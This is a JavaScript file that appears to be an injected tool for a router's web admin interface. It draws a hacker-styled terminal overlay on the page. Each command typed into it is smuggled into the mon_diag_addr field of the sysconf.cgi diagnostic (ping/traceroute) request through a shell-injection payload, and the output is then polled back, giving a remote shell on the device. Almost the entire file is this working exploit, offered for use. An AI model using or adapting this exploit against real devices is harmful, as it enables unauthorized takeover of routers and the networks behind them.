(function(){
    'use strict';
    var app = function(){
        console.log('My app constructor');
        this.defineStyles();
        this.showElementBlock();
    };

    app.prototype = {

        defineStyles: function() {
            var style = document.createElement('link');
            style.rel = "stylesheet";
            style.href = new URL("style.css", document.currentScript.src);
            document.getElementsByTagName('head')[0].appendChild(style);
        },

        inputListener: function (ev) {
            myApp.mainBlock.scrollTo(0, myApp.mainBlock.scrollHeight);
            if(ev.key === 'Tab') {
                ev.preventDefault();
                // return false;
            }
            else if(ev.key === 'Enter') {
                top.$.ajax(
                    {
                        url:"/cgi-bin/sysconf.cgi",
                        data:{
                            page:"ajax.asp",
                            action:"save_monitor_diagnostic",
                            mon_diag_type:0,
                            mon_diag_addr:'";echo "`' + this.value + ' 2>&1 `',
                            mon_ping_num:1,
                            mon_ping_size:56,
                            mon_ping_timeout:10,
                            mon_tracert_hops:30,
                            mon_diag_protocol_type:4,
                            time:(new Date()).getTime()
                        },
                        cache:false,
                        success:function(response){
                            myApp.historyBlock.innerHTML += "$ " + myApp.commandInput.value + "\n";
                            myApp.commandInput.value = "";
                            myApp.isRunning = 1;
                            myApp.writeFinished = 0;
                            myApp.intervalID=window.setInterval(myApp.responseHandler ,300);
                        },
                        error:function(xhr)
                        {}
                    }
                );
            }
        },

        responseHandler: function () {
            top.$.ajax(
                {
                    url: "/cgi-bin/sysconf.cgi",
                    data: {
                        page: "ajax.asp",
                        action: "diagnostic_tools_start",
                        notrun: myApp.isRunning,
                        time: (new Date()).getTime()
                    },
                    cache: false,
                    success: function (response) {
                        console.log("Interval request sent!");
                        if (response.length != 0) {
                            let mon_diag_status = response.split("\t")[1];
                            var message = response.split("\t")[2];
                            var tmp = response.split("\t")[3];

                            if (tmp.search("finish") > -1) {
                                if (mon_diag_status == "1") {
                                    myApp.isRunning = 0;
                                    myApp.tmpBlock.innerHTML = message;
                                } else {
                                    var stopID = window.clearInterval(myApp.intervalID);
                                    if(myApp.writeFinished == 0) {
                                        myApp.writeFinished = 1;
                                        myApp.historyBlock.innerHTML += message;
                                        myApp.tmpBlock.innerHTML = "";
                                    }
                                }
                                myApp.mainBlock.scrollTo(0, myApp.mainBlock.scrollHeight);
                            }

                        } else
                            return false;
                    },
                    error: function (xhr) { }
                }
            );
        },

        showElementBlock: function() {
            this.mainBlock = document.createElement("div");
            this.mainBlock.className = 'h4ckerContainer';
            document.body.appendChild(this.mainBlock);
            
            const topBlock = document.createElement("div");
            topBlock.className = 'h4ckerTopBlock';
            this.mainBlock.appendChild(topBlock);

            this.historyBlock = document.createElement("div");
            this.historyBlock.className = 'h4ckerHistoryBlock';
            topBlock.appendChild(this.historyBlock);

            this.tmpBlock = document.createElement("div");
            this.tmpBlock.className = 'h4ckerTempBlock';
            topBlock.appendChild(this.tmpBlock);

            const commandBlock = document.createElement("div");
            commandBlock.className = 'h4ckerCommandBlock';
            this.mainBlock.appendChild(commandBlock);

            const commandIndicator = document.createElement("span");
            commandIndicator.className = 'h4ckerCommandIndicator';
            commandIndicator.innerHTML = '$&nbsp;';
            commandBlock.appendChild(commandIndicator);

            this.commandInput = document.createElement("input");
            this.commandInput.type = "text";
            this.commandInput.autofocus = true;
            this.commandInput.className = 'h4ckerCommandInput';
            this.commandInput.addEventListener('keydown', this.inputListener);
            this.commandInput.addEventListener("blur", (e) => {setTimeout(() => e.target.focus({preventScroll:true}), 50)});
            commandBlock.appendChild(this.commandInput);
        }

    };
    var myApp = new app();
})();